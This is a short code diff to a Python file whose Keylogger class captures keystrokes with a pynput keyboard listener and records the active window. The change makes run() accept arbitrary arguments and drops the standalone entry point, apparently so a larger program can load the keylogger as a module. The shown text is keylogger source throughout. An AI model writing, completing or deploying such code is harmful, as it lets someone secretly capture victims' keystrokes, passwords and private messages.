@@ -45,7 +45,7 @@ class Keylogger:
         except Exception as e:
             print(f'[Error capturing key: {e}]', flush=True)
 
-def run():
+def run(**args):
     kl = Keylogger()
     kl.get_current_process()  # Initialize first window
 
@@ -58,7 +58,3 @@ def run():
 
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
-
-if __name__ == '__main__':
-    run()
-    print('\nDone.')
